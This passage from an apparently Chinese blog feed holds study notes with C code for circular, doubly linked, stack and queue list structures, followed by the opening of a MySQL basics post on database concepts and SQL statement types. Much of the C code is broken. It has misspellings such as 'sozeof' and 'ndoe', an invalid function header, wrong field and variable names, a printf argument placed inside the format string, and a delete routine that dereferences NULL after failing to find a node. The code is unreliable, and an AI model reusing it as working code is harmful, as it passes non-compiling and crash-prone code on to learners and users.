class="line">        myrear-&gt;next = p;</span><br><span class="line">        <span class="keyword">return</span> head;       </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; !head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法找到指定位置插入!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; head)&#123;			<span class="comment">//在非空的 循环单链表中  插入 位置任意</span></span><br><span class="line">        q = head;</span><br><span class="line">        j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i != j &amp;&amp; q-&gt;next != head)&#123;</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i != j)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点，无法插入！&quot;</span>,i);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            p-&gt;next = q-&gt;next;</span><br><span class="line">            q-&gt;next = p;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作  删除值是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *pre = <span class="literal">NULL</span>,*q;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        pre = q;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;info != x)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没有找到指定位置！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q != head)&#123;</span><br><span class="line">            pre-&gt;next = q-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(head-&gt;next == head) &#123;<span class="built_in">free</span>(q); head = <span class="literal">NULL</span>;&#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = head-&gt;next;</span><br><span class="line">                <span class="keyword">while</span>(pre-&gt;next != q) pre = pre-&gt;next;</span><br><span class="line">                head = head-&gt;next;</span><br><span class="line">                pre-&gt;next = head;</span><br><span class="line">                <span class="built_in">free</span>(q);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="题目：将一个-双链表-改成一个-循环-双链表"><a href="#题目：将一个-双链表-改成一个-循环-双链表" class="headerlink" title="题目：将一个  双链表  改成一个  循环 双链表"></a>题目：将一个  双链表  改成一个  循环 双链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">llink</span>,*<span class="title">rlink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">	p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">while</span>(p != head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将一个  双链表  改成一个  循环 双链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *r;</span><br><span class="line">    r = head;</span><br><span class="line">    <span class="keyword">while</span>(r-&gt;rlink)</span><br><span class="line">        r = r-&gt;rlink;</span><br><span class="line">    head-&gt;llink = r;</span><br><span class="line">    r-&gt;rlink = head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    change(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环双链表的内容是：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/w2KEWsoXftTZBa8.png" alt="image-20211005194850587"></p>
<h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><p>为了便于知道 链表中任意一个结点的 前驱结点 和 后继结点，我们再设一个指针域来指向该节点的前驱结点，从而形成了双链表。</p>
<p>双链表中，其结点  含有 三个域：info   llink   rlink</p>
<p><img src="https://i.loli.net/2021/10/03/nm8fFAcD5gqrICk.png" alt="image-20211003095857245"></p>
<h4 id="双链表的创建"><a href="#双链表的创建" class="headerlink" title="双链表的创建"></a>双链表的创建</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="双链表的操作"><a href="#双链表的操作" class="headerlink" title="双链表的操作"></a>双链表的操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">llink</span>,*<span class="title">rlink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">dnode *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="keyword">void</span> dnode*(dnode *head)&#123;</span><br><span class="line">    dnode *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        	p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 第 i 个结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">find_i</span><span class="params">(dnode *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    dnode *p = head;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第%d个结点位置不存在！\n,i&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i != j)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第%d个结点位置不存在！\n,i&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;  <span class="comment">//为什么？？</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在 第 i 个结点后 插入 值为 x 的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    dnode *p,*q;</span><br><span class="line">    p = (dnode*)<span class="built_in">malloc</span>(sozeof(dnode));<span class="comment">//为新的结点分配空间</span></span><br><span class="line">    p-&gt;next = x; <span class="comment">//设置新的结点值</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;  <span class="comment">//插入到第一个结点</span></span><br><span class="line">        p-&gt;llink = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;rlink = head;</span><br><span class="line">        <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">            head = p;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            head-&gt;llink = p;</span><br><span class="line">            head = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">	q = find_i(head,i);</span><br><span class="line">    <span class="keyword">if</span>(!q) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第 %d 个结点不存在，无法插入！\n&quot;</span>); <span class="keyword">return</span> head;&#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;rlink == <span class="literal">NULL</span>)&#123;  <span class="comment">//插到最后一个结点</span></span><br><span class="line">        p-&gt;rlink = q-&gt;rlink;</span><br><span class="line">        p-&gt;llink = q;</span><br><span class="line">        q-&gt;rlink = p;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  <span class="comment">//中间插入</span></span><br><span class="line">        p-&gt;rlink = q-&gt;rlink;</span><br><span class="line">        p-&gt;llink = q;</span><br><span class="line">        q-&gt;rlink-&gt;llink = p;</span><br><span class="line">        q-&gt;rlink = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除 值为 x 的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">delete</span><span class="params">(dnode *head,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *q;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表为空，无法删除！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q &amp;&amp; q-&gt;info != x)  <span class="comment">//寻找 值为 x 的结点的位置</span></span><br><span class="line">        q = q-&gt;rlink;</span><br><span class="line">    <span class="keyword">if</span>(!q)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找不到结点的位置！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q == head &amp;&amp; head-&gt;rlink)&#123;  <span class="comment">//需要删除的是第一个结点，而且表中 不只有这一个结点</span></span><br><span class="line">        head = head-&gt;rlink;</span><br><span class="line">        head-&gt;llink = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q == head &amp;&amp; !head-&gt;rlink)&#123;		 <span class="comment">//需要删除的是第一个结点，而且表中 仅仅只有这一个结点</span></span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">//直接将双链表 置空，即初始化即可</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q-&gt;rlink)&#123;	<span class="comment">//被删除的是 链表 最后一个结点</span></span><br><span class="line">            q-&gt;llink-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;		<span class="comment">//需要删除的是中间的结点</span></span><br><span class="line">            q-&gt;llink-&gt;rlink = q-&gt;rlink;</span><br><span class="line">            q-&gt;rlink-&gt;llink = q-&gt;llink;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="链式栈"><a href="#链式栈" class="headerlink" title="链式栈"></a>链式栈</h3><p>栈的链式存储，特殊的单链表</p>
<p>插入 与 删除  在 单链表的 同一端进行</p>
<p>栈顶指针  top指向第一个结点的位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_stack</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_stack</span> *<span class="title">top</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;ndoe;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化：建立一个空的 栈</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断 是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (top?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取得链式栈 栈顶的结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">read_top</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!top)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> (top-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = top;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈：插入值为 x 的结点 为 top</span></span><br><span class="line"><span class="function">node *<span class="title">push</span><span class="params">(node *top,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ndoe));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = top;</span><br><span class="line">    top = p;</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈：删除链式栈栈顶结点 top</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    node *q;</span><br><span class="line">    <span class="keyword">if</span>(!top)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    q = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h3><p>队列的链式存储，特殊的单链表</p>
<p>插入 与 删除 分别在单链表的两端进行</p>
<p>队首 front       队尾  rear  指向最后一个结点，即最后一个结点的 next 是 NULL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span>   <span class="comment">//结点定义</span></span><br><span class="line">&#125;node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    node *front,*rear;    	  <span class="comment">//队首 队尾指针 定义</span></span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化：建立一个 空的链式队列</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span> *qu;</span><br><span class="line">    qu = (<span class="built_in">queue</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>));</span><br><span class="line">    qu-&gt;front = <span class="literal">NULL</span>;</span><br><span class="line">    qu-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断 链式队列 是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(<span class="built_in">queue</span> qu)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (qu.front ? <span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="built_in">queue</span> *qu)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    p = qu-&gt;front;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式队列的空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取得链式队列队首结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">read_front</span><span class="params">(<span class="built_in">queue</span> qu)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!p.front)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式队列是空的！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (qu.front-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作  队尾插入</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">insert</span><span class="params">(<span class="built_in">queue</span> *qu,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(qu-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">        qu-&gt;front = qu-&gt;rear = p;  <span class="comment">//当队列本身是 空 时</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        qu-&gt;rear-&gt;next = p;   <span class="comment">//队尾插入</span></span><br><span class="line">        qu-&gt;rear = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作：队首删除</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">delete</span><span class="params">(<span class="built_in">queue</span> *qu)</span></span>&#123;</span><br><span class="line">    node *q;</span><br><span class="line">    <span class="keyword">if</span>(!qu-&gt;front)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;队列为空，无法插入！\n&quot;</span>); <span class="keyword">return</span> qu;&#125;</span><br><span class="line">    q = qu-&gt;front;</span><br><span class="line">    qu-&gt;front = q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">if</span>(qu-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">        qu-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链式存储</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL基础全</title>
    <url>/2021/11/21/MYSQL%E5%9F%BA%E7%A1%80%E5%85%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="MYSQL-数据库"><a href="#MYSQL-数据库" class="headerlink" title="MYSQL 数据库"></a>MYSQL 数据库</h1><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="sql，DB，-DBMS-概念理解"><a href="#sql，DB，-DBMS-概念理解" class="headerlink" title="sql，DB， DBMS   概念理解"></a>sql，DB， DBMS   概念理解</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DB：DataBase 数据库<span class="comment">--在硬盘上以 **文件** 的形式存在</span></span><br><span class="line">DBMS：DataBase Management <span class="keyword">System</span> 数据库管理系统</span><br><span class="line">常见的数据库管理系统：Oracle，Mysql，DB2，Sybase，SqlServer</span><br><span class="line"><span class="keyword">SQL</span>：结构化查询语言，是一门标准通用的高级语言。标准的<span class="keyword">sql</span>适合所有的数据库产品。</span><br><span class="line">注：</span><br><span class="line"><span class="keyword">sql</span> 语句在执行的时候，首先在内部进行编译，然后才执行<span class="keyword">sql</span>语句，它的编译由DBMS完成。</span><br><span class="line">三者关系：DBMS通过执行 <span class="keyword">sql</span> 语句来操作 DB 当中的数据</span><br></pre></td></tr></table></figure>
<h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">数据库的基本组成单元，所有的数据都以表格的形式组织</span><br><span class="line">一个表包括：</span><br><span class="line">行(data)：被称为  数据 <span class="operator">/</span> 记录</span><br><span class="line">列(<span class="keyword">column</span>)：被称为  字段</span><br><span class="line">字段的属性：</span><br><span class="line">字段名，数据类型，相关的约束</span><br></pre></td></tr></table></figure>

<h2 id="二、SQL-语句分类："><a href="#二、SQL-语句分类：" class="headerlink" title="二、SQL 语句分类："></a>二、SQL 语句分类：</h2><blockquote>
<p> 1.**DQL(数据查询语言)**：查询语句，所有的 select 语句<br> 2.**DML(数据操作语言)**：insert , delete , update , 对表中的 <strong>数据</strong> 进行 增删改<br> 3.**DDL(数据定义语言)**：create , drop , alter 对表 <strong>结构</strong> 的 增删改<br> 4.**TCL(事务控制语言)**：commit 提交数据，rollback 回滚数据 Transaction<br> 5.**DCL(数据控制语言)**：grant 授权，revoke 撤销权限等</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line">1.任何一条 sql语句 以`;`结尾</span><br><span class="line">2.sql语句 不区分大小写</span><br><span class="line">3.字段可参与数学运算</span><br><span class="line">4.字符串要用单引号引起来</span><br></pre></td></tr></table></figure>
